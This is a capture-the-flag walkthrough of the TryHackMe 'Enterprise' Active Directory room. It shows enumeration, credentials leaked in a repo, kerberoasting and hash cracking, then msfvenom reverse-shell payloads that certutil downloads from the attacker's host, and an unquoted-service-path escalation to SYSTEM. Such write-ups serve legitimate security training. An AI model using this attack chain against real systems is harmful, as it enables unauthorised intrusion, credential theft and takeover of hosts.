This TryhackMe room that helps solidify Active Directory penetration testing.

Machine IP: 10.10.105.193

# Scanning

## Nmap

```
sudo nmap -sC -sV -O 10.10.105.193
```

![](../../assets/images/ent/nmap1.png)

We have port 53,88,135,389,445,464, 636 etc.

Also, rustscan to see if we have more ports running on the target

```
└─$ rustscan -a 10.10.105.193 --ulimit 5000 -- -A -sC -oN nmap_scan
```

![](../../assets/images/ent/nmap2.png)

We found an extra port 7790
![](../../assets/images/ent/rust2.png)

Also see the domain: "LAB.ENTERPRISE.THM", "LAB-DC.LAB.ENTERPRISE.THM", "ENTERPRISE.THM"

![](../../assets/images/ent/hosts.png)

Find potential users

```
kerbrute_linux_amd64 userenum --dc 10.10.105.193 -d LAB.ENTERPRISE.THM /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

![](../../assets/images/ent/kerb.png)
Save output in raw_users.txt, then we clean the file to maintain only users

```
cat raw_users.txt | cut -d " " -f 14 | cut -d "@" -f 1 | tee users.txt
cat raw_users.txt | cut -d " " -f 14 | tee user_domain.txt
```

![](../../assets/images/ent/users.png)
![](../../assets/images/ent/domain_user.png)

## DNS Enum

```
└─$ dig  @10.10.105.193 LAB.ENTERPRISE.THM
```

![](../../assets/images/ent/dns.png)

Since port 80 is open, let's visit it
![](../../assets/images/ent/88.png)

## Web enumeration

FILES:

```
export URL="http://lab.enterprise.thm/FUZZ"
wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt --hc 404 "$URL"
```

![](../../assets/images/ent/files.png)
robots.txt
![](../../assets/images/ent/robot.png)

DIRECTORIES

```
export URL="http://lab.enterprise.thm/FUZZ/"
wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404 "$URL
```

## SMB enumeration

```
smbclient -L \\\\10.10.105.193\\
smbclient \\\\10.10.105.193\\Docs
smbclient \\\\10.10.105.193\\Users
```

![](../../assets/images/ent/smb1.png)
![](../../assets/images/ent/smb2.png)
![](../../assets/images/ent/smb3.png)

## Enumerate port 7990

We get an Atlassian instance
![](../../assets/images/ent/7790.png)

FILES:

```
export URL="http://10.10.105.193:7790/FUZZ"
wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt --hc 404 "$URL"
```

![](../../assets/images/ent/7790_1.png)Projectone

DIRECTORIES

```
export URL="http://10.10.105.193:7990/FUZZ/"
wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404 "$URL"
```

Recall that we have a list of potential users, we bruteforce using Burp Intruder. That did not work. Now, since we have an Atlassian page, we can deduce that we would have a github repo of Enterprise THM.

![](../../assets/images/ent/git.png)

We see this THM enterprise repo, looking closely, we see the About-Us repo. In the people tab, we see Nik-enterprise-dev .
![](../../assets/images/ent/git_page.png)
![](../../assets/images/ent/peep.png)

Digging deeper, we see a new powershell repo with hardcoded credentials (nik: ToastyBoi!)
![](../../assets/images/ent/ps.png)

Try credentials on SMB logins:

```
crackmapexec smb 10.10.137.231 -u nik -p 'ToastyBoi!'"
```

![](../../assets/images/ent/crack.png)

It works!! Let's see enumerate SMB with the newly discovered valid credentials:

```
smbclient -L 10.10.137.231 -U nik
```

![](../../assets/images/ent/smb4.png)

```
smbclient \\\\10.10.137.231\\ADMIN$ -U nik
```

We still get same access like we did initially. Let's circle back to the Actice Directory attack strategy.
![](../../assets/images/ent/ad.png)

This is from my note. So, we could check if the nik user is kerberoastable using GetSPN command:

```
impacket-GetUserSPNs -request LAB.ENTERPRISE.THM/nik -dc-ip 10.10.137.231
```

![](../../assets/images/ent/ker.png)
We see that the nik user is indeed kerberoastable and we can proceed to cracking the hash.

```
john --format=krb5tgs hahs --wordlist=/usr/share/wordlists/rockyou.txt
```

![](../../assets/images/ent/john.png)

It means we can login via winrm and psexec using (bitbucket: littleredbucket), but they didn't work. I eventually tied xfreerdp.

```
xfreerdp /v:10.10.137.231 /u:bitbucket /p:littleredbucket /dynamic-resolution +clipboard
```

![](../../assets/images/ent/rdp.png)

The user flag is just on the desktop.

### Getting Root

First, we need to find a way to get a stable shell, preferabbly getting the shell on our attacker machine. This can be done by using msfvenom.

#### Create payload

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.67.255 LPORT=4443 -f exe -o shell.exe
```

Download payload on victim machine and execute

```
certutil.exe -urlcache -f http://10.11.67.255/shell.exe shell.exe
```

We have a shell on our kali machine:
![](../../assets/images/ent/stable.png)

Now we can run winpeas to find low-haniging fruits.

#### Convert shell to powershell

```
powershell -ep bypass
```

We notice an unquoted service path vulnerability we can take advantage of. The service is running zerotieroneservice.
![](../../assets/images/ent/unq.png)
Path: C:\Program Files (x86)\Zero Tier\Zero Tier One\ZeroTier One.exe.
We need to create a reverse shell payload, replace it with the zero tier one file.

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.67.255 LPORT=4433 -f exe -o ZeroTier.exe
```

![](../../assets/images/ent/msf.png)

```
certutil.exe -urlcache -f http://10.11.67.255/ZeroTier.exe ZeroTier.exe
copy ZeroTier.exe "C:\Program Files (x86)\Zero Tier\Zero Tier One\"
Start-Service zerotieroneservice
```

...and we get nt authority
